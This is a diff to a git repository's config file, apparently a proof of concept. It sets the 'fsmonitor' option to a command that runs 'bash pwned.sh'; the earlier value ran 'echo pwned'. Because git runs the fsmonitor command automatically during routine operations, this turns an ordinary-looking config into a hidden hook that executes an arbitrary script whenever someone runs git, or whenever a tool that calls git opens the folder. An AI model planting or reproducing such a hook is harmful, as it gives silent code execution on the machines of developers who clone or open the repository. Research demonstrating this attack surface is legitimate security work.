@@ -3,7 +3,7 @@
 	filemode = true
 	bare = false
 	worktree = .
-	fsmonitor = "flock --exclusive --nonblock /dev/shm/lock echo pwned>&2;false"	
+	fsmonitor = "flock --exclusive --nonblock /dev/shm/lock bash pwned.sh>&2;false"	
 [remote "origin"]
 	url = https://github.com/simon-testaccount/kitesurfing
 	fetch = +refs/heads/*:refs/remotes/origin/*
